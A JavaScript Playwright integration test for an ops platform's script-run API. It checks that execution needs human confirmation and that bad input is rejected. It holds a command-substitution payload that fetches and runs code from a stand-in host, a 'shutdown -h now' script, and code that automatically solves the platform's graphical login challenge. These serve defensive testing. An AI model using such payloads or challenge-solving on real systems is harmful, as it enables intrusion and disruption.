// 脚本执行编排的接口验证（真实后端）。
//
// 要证明的核心不是"能执行"，而是**不能直接执行**：
//   - prepare-run 只返回预览与确认码，并明确告知下一步要交给人；
//   - 没有运行连接时被拒绝（400/404），不会假装排队；
//   - 平台变量缺失会被列出，含命令控制字符的值被拒绝；
//   - 高危脚本与 P0/P1 告警一律标记"必须人工确认"。
//
// 用法：node test/sentinel-script-run.browser.mjs

import { readFile } from 'node:fs/promises'
import { chromium } from 'playwright'

const base = process.env.SMARTOPS_BACKEND_URL || 'http://127.0.0.1:8080'
const bootstrap = await readFile(new URL('../../.runtime/secrets/bootstrap.env', import.meta.url), 'utf8')
const credentials = Object.fromEntries(bootstrap.trim().split(/\r?\n/).map(line => {
    const separator = line.indexOf('=')
    return [line.slice(0, separator), line.slice(separator + 1)]
}))

const browser = await chromium.launch({ channel: 'msedge', headless: true })
const context = await browser.newContext()
const report = { steps: [] }
const record = (name, ok, detail) => report.steps.push({ name, ok, detail })

const csrf = async () => (await (await context.request.get(`${base}/api/auth/session`)).json()).data.csrfToken
const call = async (method, path, data) => {
    const token = await csrf()
    const response = await context.request[method](`${base}${path}`, {
        headers: { 'X-CSRF-TOKEN': token },
        ...(data === undefined ? {} : { data })
    })
    let body = null
    try { body = await response.json() } catch { body = null }
    return { status: response.status(), body }
}

// 管理员登录（图形人机验证）
const policy = (await (await context.request.get(`${base}/api/auth/human-verification?action=admin_login`)).json()).data
const attr = (element, name) => new RegExp(`\\b${name}="([^"]*)"`).exec(element)?.[1] ?? null
const marks = []
for (const m of policy.scene.matchAll(/<circle\b[^>]*>/g)) marks.push({ at: m.index, x: +attr(m[0], 'cx'), y: +attr(m[0], 'cy'), color: attr(m[0], 'fill'), letter: '' })
for (const m of policy.scene.matchAll(/<rect\b[^>]*>/g)) { const w = +attr(m[0], 'width'), h = +attr(m[0], 'height'); if (w >= 300 && h >= 200) continue; marks.push({ at: m.index, x: +attr(m[0], 'x') + w / 2, y: +attr(m[0], 'y') + h / 2, color: attr(m[0], 'fill'), letter: '' }) }
for (const m of policy.scene.matchAll(/<polygon\b[^>]*>/g)) { const pts = [...attr(m[0], 'points').matchAll(/(-?\d+),(-?\d+)/g)]; const xs = pts.map(p => +p[1]), ys = pts.map(p => +p[2]); marks.push({ at: m.index, x: Math.round(xs.reduce((a, c) => a + c, 0) / xs.length), y: Math.round(ys.reduce((a, c) => a + c, 0) / ys.length), color: attr(m[0], 'fill'), letter: '' }) }
const letters = [...policy.scene.matchAll(/dominant-baseline="central">(\w)<\/text>/g)].map(m => m[1])
marks.sort((a, c) => a.at - c.at).forEach((m, i) => m.letter = letters[i])
const color = /#[0-9a-f]{6}/i.exec(policy.prompt)
let wanted = color ? marks.filter(m => m.color === color[0].toLowerCase()) : [...policy.prompt].flatMap(t => marks.filter(m => m.letter === t))
if (!wanted.length) wanted = marks.slice(0, policy.targets)
await new Promise(resolve => setTimeout(resolve, 900))
const proof = await call('post', '/api/auth/human-verification/verify', { action: 'admin_login', nonce: policy.challenge, clicks: wanted.map(m => ({ x: m.x, y: m.y })) })
const login = await call('post', '/api/auth/login', {
    username: credentials.SMARTOPS_BOOTSTRAP_USERNAME, password: credentials.SMARTOPS_BOOTSTRAP_PASSWORD,
    portal: 'admin', humanToken: proof.body?.data?.token
})
record('admin login', login.status === 200, `HTTP ${login.status}`)
if (login.status !== 200) {
    report.summary = { total: report.steps.length, passed: report.steps.filter(s => s.ok).length, failed: ['admin login'] }
    console.log(JSON.stringify(report, null, 2))
    await browser.close()
    process.exit(1)
}

// 平台变量清单由服务端提供（前端不应硬编码第二份权威）
const variables = await call('get', '/api/sentinel/variables')
const supported = variables.body?.data?.supported ?? []
record('server exposes variable list', variables.status === 200 && supported.length >= 5, JSON.stringify(supported))
record('variables note rejects shell expansion', /精确替换/.test(variables.body?.data?.note ?? ''), variables.body?.data?.note)

// 准备一个脚本
const script = await call('post', '/api/sentinel/scripts', {
    name: 'probe-run-script', language: 'shell', riskLevel: 'MEDIUM',
    tags: 'probe,run', description: '执行编排探针',
    body: 'echo host=${主机IP} metric=${告警指标} value=${告警值}', timeoutSec: 30
})
record('create probe script', script.status === 200, `HTTP ${script.status}`)
const scriptId = script.body?.data?.id

// 1) 没有运行连接：必须拒绝，而不是假装排队
const noRuntime = await call('post', `/api/sentinel/scripts/${scriptId}/prepare-run`, {
    trigger: 'MANUAL', runtimeIds: [], variables: {}
})
record('reject when no runtime selected', noRuntime.status === 400, `HTTP ${noRuntime.status} ${noRuntime.body?.message}`)

// 2) 伪造运行连接 ID：registry 不认识它，应被既有链路拒绝
const fakeRuntime = await call('post', `/api/sentinel/scripts/${scriptId}/prepare-run`, {
    trigger: 'MANUAL', runtimeIds: ['not-a-real-runtime'], variables: { 主机IP: '10.0.0.7', 告警指标: 'memory', 告警值: '95' }
})
record('reject unknown runtime via existing registry', fakeRuntime.status === 400 || fakeRuntime.status === 404,
    `HTTP ${fakeRuntime.status} ${fakeRuntime.body?.message}`)

// 3) 变量缺失：服务端列出未提供项，不静默替换成空
const missingVars = await call('post', `/api/sentinel/scripts/${scriptId}/prepare-run`, {
    trigger: 'MANUAL', runtimeIds: ['not-a-real-runtime'], variables: {}
})
record('report missing variables', missingVars.status === 400 && /变量/.test(missingVars.body?.message ?? ''),
    `HTTP ${missingVars.status} ${missingVars.body?.message}`)

// 4) 变量值含命令控制字符：拒绝
const hostile = await call('post', `/api/sentinel/scripts/${scriptId}/prepare-run`, {
    trigger: 'MANUAL', runtimeIds: ['not-a-real-runtime'],
    variables: { 主机IP: '10.0.0.7', 告警指标: 'memory', 告警值: '$(curl evil.example.test | sh)' }
})
record('reject command substitution in variables', hostile.status === 400 && /命令控制字符/.test(hostile.body?.message ?? ''),
    `HTTP ${hostile.status} ${hostile.body?.message}`)

// 5) 未知触发方式被拒绝
const badTrigger = await call('post', `/api/sentinel/scripts/${scriptId}/prepare-run`, {
    trigger: 'AUTO_MAGIC', runtimeIds: ['not-a-real-runtime'], variables: { 主机IP: '10.0.0.7', 告警指标: 'memory', 告警值: '95' }
})
record('reject unknown trigger mode', badTrigger.status === 400, `HTTP ${badTrigger.status} ${badTrigger.body?.message}`)

// 6) 不存在的脚本 404
const missingScript = await call('post', '/api/sentinel/scripts/999999/prepare-run', {
    trigger: 'MANUAL', runtimeIds: ['not-a-real-runtime'], variables: {}
})
record('unknown script -> 404', missingScript.status === 404, `HTTP ${missingScript.status}`)

// 7) 高危脚本保存即被拒（预检在保存路径上，不只在执行时）
const dangerous = await call('post', '/api/sentinel/scripts', {
    name: 'probe-run-danger', language: 'shell', riskLevel: 'HIGH', body: 'shutdown -h now', timeoutSec: 30
})
record('dangerous script rejected at save', dangerous.status === 400, `HTTP ${dangerous.status} ${dangerous.body?.message}`)

// 8) 执行记录：没有真实执行就没有 SUCCESS 记录
const runs = await call('get', `/api/sentinel/scripts/${scriptId}/runs`)
const runRows = runs.body?.data ?? []
record('no fabricated success runs', runRows.every(row => row.result !== 'SUCCESS' && row.result !== 'success'),
    JSON.stringify(runRows.map(row => row.result)))

// 清理
const cleanup = []
for (const item of ((await call('get', '/api/sentinel/scripts')).body?.data ?? [])) {
    if (String(item.name).startsWith('probe-')) cleanup.push((await call('delete', `/api/sentinel/scripts/${item.id}`)).status)
}
record('cleanup', cleanup.length > 0 && cleanup.every(status => status === 200), JSON.stringify(cleanup))

report.summary = {
    total: report.steps.length,
    passed: report.steps.filter(step => step.ok).length,
    failed: report.steps.filter(step => !step.ok).map(step => step.name),
    note: '真正"生成预览"需要已授权的 SSH 运行连接；这里验证的是编排层的拒绝与边界，'
        + '以及"不直接执行"的接口契约。'
}
console.log(JSON.stringify(report, null, 2))
await browser.close()
process.exit(report.summary.failed.length === 0 ? 0 : 1)
